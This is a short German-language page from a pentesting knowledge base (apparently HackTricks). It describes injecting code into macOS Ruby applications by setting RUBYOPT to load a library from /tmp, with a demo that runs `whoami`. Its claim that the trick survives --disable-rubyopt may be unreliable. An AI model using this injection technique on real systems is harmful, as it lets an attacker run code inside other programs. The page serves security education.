# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Mit dieser Umgebungsvariable ist es möglich, **neue Parameter** zu **ruby** hinzuzufügen, wann immer es ausgeführt wird. Obwohl der Parameter **`-e`** nicht verwendet werden kann, um Ruby-Code anzugeben, ist es möglich, die Parameter **`-I`** und **`-r`** zu verwenden, um einen neuen Ordner zum Bibliotheksladepfad hinzuzufügen und dann **eine Bibliothek zum Laden anzugeben**.

Erstellen Sie die Bibliothek **`inject.rb`** in **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Erstellen Sie irgendwo ein Ruby-Skript wie:
```ruby:hello.rb
puts 'Hello, World!'
```
Dann lassen Sie ein beliebiges Ruby-Skript es mit:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Fun Fact: Es funktioniert sogar mit dem Parameter **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
